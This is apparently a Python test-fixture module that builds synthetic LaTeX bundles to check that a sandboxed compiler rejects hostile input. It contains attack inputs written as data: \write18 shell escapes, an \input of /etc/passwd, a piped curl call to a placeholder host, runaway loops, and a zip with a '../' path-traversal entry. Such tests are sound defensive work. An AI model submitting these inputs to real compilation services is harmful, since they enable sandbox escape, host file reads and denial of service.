"""Synthetic fixtures and bounded reporting for LaTeX compiler qualification."""

from __future__ import annotations

import zipfile
from dataclasses import dataclass
from io import BytesIO


@dataclass(frozen=True)
class QualificationCase:
    name: str
    bundle: bytes
    expected: str


def _zip(files: dict[str, bytes]) -> bytes:
    output = BytesIO()
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for path, content in files.items():
            archive.writestr(path, content)
    return output.getvalue()


def _document(body: str) -> bytes:
    return (
        f"\\documentclass{{article}}\n\\begin{{document}}\n{body}\n\\end{{document}}\n"
    ).encode()


def _path_traversal_archive() -> bytes:
    output = BytesIO()
    with zipfile.ZipFile(output, "w") as archive:
        archive.writestr("../outside.tex", _document("no"))
    return output.getvalue()


def qualification_cases() -> tuple[QualificationCase, ...]:
    """Return fixed synthetic cases spanning the compiler trust boundary."""
    return (
        QualificationCase(
            "valid-document", _zip({"main.tex": _document("safe")}), "succeeded"
        ),
        QualificationCase(
            "shell-escape",
            _zip({"main.tex": _document("\\immediate\\write18{touch escaped}")}),
            "failed",
        ),
        QualificationCase(
            "host-file-read",
            _zip({"main.tex": _document("\\input{/etc/passwd}")}),
            "failed",
        ),
        QualificationCase(
            "network-pipe",
            _zip({"main.tex": _document('\\input|"curl https://example.invalid"')}),
            "failed",
        ),
        QualificationCase(
            "recursive-expansion",
            _zip({"main.tex": _document("\\def\\looped{\\looped}\\looped")}),
            "failed",
        ),
        QualificationCase(
            "process-pressure",
            _zip({"main.tex": _document("\\immediate\\write18{yes > pressure}")}),
            "failed",
        ),
        QualificationCase(
            "cpu-limit",
            _zip(
                {
                    "main.tex": _document(
                        "\\newcount\\pwcCounter \\pwcCounter=0 "
                        "\\loop \\advance\\pwcCounter by 1 "
                        "\\ifnum\\pwcCounter<1000000000 \\repeat"
                    )
                }
            ),
            "failed",
        ),
        QualificationCase(
            "oversized-output",
            _zip(
                {
                    "main.tex": _document(
                        "\\newcount\\n \\n=0 \\loop \\immediate\\write16{output} "
                        "\\advance\\n by 1 \\ifnum\\n<200000 \\repeat"
                    )
                }
            ),
            "failed",
        ),
        QualificationCase(
            "path-traversal-archive", _path_traversal_archive(), "rejected"
        ),
        QualificationCase("malformed-archive", b"not a zip archive", "rejected"),
        QualificationCase(
            "hostile-pdf",
            _zip(
                {
                    "main.tex": _document("\\includegraphics{figure}"),
                    "figure.pdf": b"%PDF- malformed",
                }
            ),
            "failed",
        ),
    )


def report(results: list[tuple[QualificationCase, str, int]]) -> dict[str, object]:
    rows = [
        {"name": case.name, "outcome": outcome, "elapsed_ms": elapsed_ms}
        for case, outcome, elapsed_ms in results
    ]
    return {
        "cases": rows,
        "passed": sum(case.expected == outcome for case, outcome, _ in results),
        "total": len(rows),
    }
